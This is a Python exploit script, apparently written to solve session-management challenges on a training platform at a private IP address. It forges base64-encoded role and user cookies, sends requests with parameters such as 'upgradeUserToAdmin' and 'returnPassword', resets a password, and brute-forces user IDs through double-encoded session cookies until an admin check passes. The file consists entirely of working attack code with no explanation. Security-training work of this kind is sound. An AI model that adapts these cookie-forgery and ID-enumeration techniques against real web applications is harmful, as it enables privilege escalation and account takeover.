import requests
import base64


class SessionManagementExploits:

    @staticmethod
    def request_admin(target_url, post_data, request_headers, request_cookies):
        response = requests.post(url=target_url, data=post_data, headers=request_headers, cookies=request_cookies, verify=False)
        print('response: ', response.text)

    @staticmethod
    def request_change_password(target_url, post_data, request_headers, request_cookies):
        response = requests.post(url=target_url, data=post_data, headers=request_headers, cookies=request_cookies, verify=False)
        print('response: ', response.text)

    @staticmethod
    def fuzz_user_id(target_url, post_data, request_headers, request_cookies):
        response = requests.post(url=target_url, data=post_data, headers=request_headers, cookies=request_cookies, verify=False)
        counter = 1
        user_id = '000000000000000' + str(counter)

        while 'not an Admin' in response.text:
            counter += 1
            print('Failed attempt with id: ' + user_id)

            if counter < 10:
                user_id = '000000000000000' + str(counter)
            else:
                user_id = '00000000000000' + str(counter)

            post_data['userId'] = user_id
            request_cookies['SubSessionID'] = base64.b64encode(base64.b64encode(user_id.encode())).decode()
            print('Trying new Cookie: ', request_cookies['SubSessionID'])
            response = requests.post(url=target_url, data=post_data, headers=request_headers, cookies=request_cookies, verify=False)

        print('UserId found: ', user_id)
        print(response.text)


if __name__ == '__main__':
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'X-Requested-With': 'XMLHttpRequest'
    }

    cookies = {
        'checksum': base64.b64encode(b'userRole=administrator').decode(),
        'JSESSIONID': '77AF77D99C0251E144160CD5E8BCAB68',
        'token': '166819326658170591354926447561272834463',
        'JSESSIONID3': 'GRMIgXdfZcUPM4XMOJpeig=='
    }

    data = {
        'adminDetected': 'true',
        'returnPassword': 'true',
        'upgradeUserToAdmin': 'true'
    }

    url = 'https://172.50.1.5:9443/challenges/dfd6bfba1033fa380e378299b6a998c759646bd8aea02511482b8ce5d707f93a'

    print(cookies)

    SessionManagementExploits.request_admin(url, data, headers, cookies)

    cookies = {
        'current': base64.b64encode(base64.b64encode(b'admin')).decode(),
        'JSESSIONID': '77AF77D99C0251E144160CD5E8BCAB68',
        'token': '166819326658170591354926447561272834463',
        'JSESSIONID3': 'GRMIgXdfZcUPM4XMOJpeig=='
    }

    data = {
        'newPassword': '12345678',
    }

    url = 'https://172.50.1.5:9443/challenges/b467dbe3cd61babc0ec599fd0c67e359e6fe04e8cdc618d537808cbb693fee8a'

    print(cookies)

    SessionManagementExploits.request_change_password(url, data, headers, cookies)

    cookies = {
        'checksum': base64.b64encode(b'userRole=administrator').decode(),
        'current': base64.b64encode(base64.b64encode(b'admin')).decode(),
        'SubSessionID': base64.b64encode(base64.b64encode(b'0000000000000001')).decode(),
        'JSESSIONID': '77AF77D99C0251E144160CD5E8BCAB68',
        'token': '166819326658170591354926447561272834463',
        'JSESSIONID3': 'GRMIgXdfZcUPM4XMOJpeig=='
    }

    data = {
        'userId': '0000000000000001',
        'useSecurity': 'true'
    }

    url = 'https://172.50.1.5:9443/challenges/ec43ae137b8bf7abb9c85a87cf95c23f7fadcf08a092e05620c9968bd60fcba6'

    print(cookies)

    SessionManagementExploits.fuzz_user_id(url, data, headers, cookies)
